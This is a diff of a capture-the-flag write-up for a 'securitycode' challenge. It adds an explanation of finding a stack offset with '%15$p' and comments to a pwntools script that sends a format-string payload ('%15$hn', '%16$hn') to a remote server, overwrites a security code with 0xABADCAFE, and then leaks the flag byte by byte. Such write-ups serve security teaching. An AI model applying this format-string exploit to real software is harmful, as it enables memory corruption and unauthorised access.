@@ -48,31 +48,49 @@ Again we should do another `format string` exploit and try to read of memory val
 - There is a limitation on reading value in this step, so we should read 6 string of flag at a time, 
 and provide an offset on location we are reading in next hit.
 
-### Writeup is not completed, will be completed with more details
+To find offset of where is the `security_code` location from stack, I just fuzzed with giving below input format 
+and findout that it is location at position 15. So we should point to location of it using format string
+`%15$n`
 
-Here is the final exploit code to receive the flag:
+```bash
+AAAA%15$p
+Hello our dear admin, AAAA0x41414141
+```
+As u can see the value `AAAA` that we provided, is overwriten in location offset `%15$n`.
+This is our start point.
+
+### The rest detail of explit is written on codes below. Will try to make it more details later.
+
+The final exploit code to receive the flag:
 
 ```python
 from pwn import *
 
 flag = ''
 
+# We will hit program for 30 iterations (just a number to get all available characters in flag)
+# And in each try will change offset of getting flag value.
 for i in range(30):
+
+	# First we will connect to program using pwntools methods.
     # r = process("./securitycode")
     r = remote('185.97.118.167', 7040)
+
+    # First Send A to be forwarded to hello_admin
+    r.recvuntil("Enter 'A' for admin and 'U' for user.")
+    r.sendline('A')
 
     # Value to overwrite is: xABADCAFE
     # ABAD: 43949
     # CAFE: 51966
-
-    r.recvuntil("Enter 'A' for admin and 'U' for user.")
-    r.sendline('A')
+    # So we need to first write this value in location of security_code address,
+    # But cause it's more than two bytes, we will try to write two times in our format string payload.
+    # cause CAFE is of a higher value we should first write it in location 15 from stack
     r.recvuntil('Enter you name:')
-
     payload = '\x3e\xc0\x04\x08\x3c\xc0\x04\x08%43941x%15$hn%8017x%16$hn'
     r.sendline(payload)
 
-    # Now try to read 6 bytes of the flag
+    # Now try to read of the flag step by step
     r.recvuntil('Enter your password:')
     payload = '%{}$x'.format(i)
     r.sendline(payload)
@@ -81,7 +99,7 @@ for i in range(30):
     x += r.recvline()
     x += r.recvline()
     x = x.replace('The password is ', '').strip()
-    # print(x.decode('hex'))
+    # it's just a method i used, it's not very clean, but got me the flag :)!
     try:
         flag += bytearray.fromhex(x).decode()[::-1]
     except:
